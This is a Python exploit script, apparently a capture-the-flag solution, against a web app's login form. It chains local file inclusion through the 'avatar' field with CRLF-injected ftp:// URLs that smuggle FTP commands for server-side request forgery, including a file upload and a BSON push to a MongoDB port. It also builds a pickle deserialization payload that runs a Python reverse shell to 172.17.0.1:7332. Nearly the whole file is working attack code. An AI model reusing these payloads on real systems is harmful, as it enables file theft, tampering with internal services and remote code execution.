import urllib.request
import random
import string
import pickle
import base64
import os
import re
import requests
import socket

ftp_host = "172.20.0.2:8877"
upload_port = 7331
upload_host = "172.17.0.1"
upload = '{},{},{}'.format(upload_host.replace('.', ','), upload_port >> 8, upload_port & 0xff)
upload_contents = "Hello World This is a test! \n"
baseURL = "http://172.20.0.6:5000/"

def generateUsername():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k = 8)) 



def payload(ftp_cmds):
    return 'ftp://fan\r\n{}:root@'.format('\r\n'.join(ftp_cmds)) + ftp_host



def LFI():
    while True:
        target = input("Input: ")
        r = requests.post("http://172.20.0.6:5000/login" , data={"username": generateUsername(), "password": "12345", "avatar": target, "submit": "Go!"})
        result = re.findall("<img src=\"(.*?)\" class=\"img-thumbn", r.text)
        try:
            print(base64.b64decode(result[0].replace('data:image/png;base64,', '')).decode())
        except:
            print("error")




def CreateEmptyFile():
    ftp_cmds = [
        "USER fan",
        "PASS root",
        'STOR anyfile',
    ]
    target = 'ftp://fan\r\n{}:root@'.format('\r\n'.join(ftp_cmds)) + ftp_host
    print(target)
    r = requests.post(f"{baseURL}/login", data={"username": generateUsername(), "password": "12345", "avatar": target, "submit": "Go!"})
    


def CreateFileWithContent(filename="temp.txt",upload_contents="Testing File Upload !\n".encode()):
    ftp_cmds = [
        "USER fan",
        "PASS root",
        "CWD files",
        "TYPE A", 
        "PORT {}".format(upload),
        "STOR {}".format(filename)
    ]
    print(upload)
    target = 'ftp://fan\r\n{}:root@'.format('\r\n'.join(ftp_cmds)) + ftp_host

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", upload_port))
    sock.listen(1)

    r = requests.post(f"{baseURL}/login", data={"username": generateUsername(), "password": "12345", "avatar": target, "submit": "Go!"})
    
    target_conn, addr = sock.accept()
    print(addr)
    target_conn.sendall(upload_contents) 
    print("File uploaded")


def GeneratePicklePayload():
    class RCE:
        def __reduce__(self):
            cmd = ("""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",7332));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'""")
            return os.system, (cmd,)
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
    payload = base64.urlsafe_b64encode(pickled).decode()
    open("exploit.b64", "w").write(payload)
    return payload
    

def SendBinFileToMongoDb():
    upload_port = 27017
    upload_host = "172.20.0.5"
    upload = '{},{},{}'.format(upload_host.replace('.', ','), upload_port >> 8, upload_port & 0xff)

    ftp_cmds = [
        "USER fan",
        "PASS root",
        "CWD files",
        "TYPE I", 
        "PORT {}".format(upload),
        "RETR bson.bin"
    ]
    target = 'ftp://fan\r\n{}:root@'.format('\r\n'.join(ftp_cmds)) + ftp_host
    r = requests.post(f"{baseURL}/login", data={"username": generateUsername(), "password": "12345", "avatar": target, "submit": "Go!"})

if __name__ == "__main__":
    PicklePayload()